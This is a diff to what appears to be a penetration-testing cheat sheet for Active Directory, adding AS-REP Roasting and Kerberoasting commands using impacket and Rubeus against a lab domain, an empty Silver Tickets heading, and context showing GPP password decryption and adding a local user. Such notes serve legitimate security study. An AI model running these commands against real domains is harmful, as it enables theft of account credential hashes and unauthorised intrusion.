@@ -168,6 +168,25 @@ ls \\dc1.corp.com\sysvol\corp.com\
 gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ```
 
+## AS-REP Roasting
+```bash
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+.\Rubeus.exe asreproast /nowrap
+
+```
+
+
+## Kerberoast
+```bash
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+
+## Silver Tickets
+```bash
+```
+
+
 ## Add user
 ```bash
 > net user nuri password123! /add
